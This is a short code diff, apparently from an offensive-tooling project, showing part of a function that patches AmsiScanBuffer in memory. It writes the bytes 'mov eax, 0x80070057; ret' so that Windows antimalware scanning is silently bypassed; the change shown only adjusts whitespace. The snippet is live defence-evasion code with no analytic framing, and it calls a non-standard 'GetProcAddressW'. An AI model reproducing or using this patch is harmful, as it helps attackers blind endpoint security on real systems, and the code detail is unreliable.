@@ -28,7 +28,7 @@ void PatchAmsiScanBuffer()
 	FARPROC addr = ::GetProcAddressW(amsiDllHandle, L"AmsiScanBuffer");
 	
 	// https://rastamouse.me/blog/asb-bypass-pt3/
-	char patch[6] = {0xB8, 0x57, 0x00, 0x07,0x80, 0xC3};
+	char patch[6] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
 	
 	HANDLE processHandle = ::GetCurrentProcess();
 	
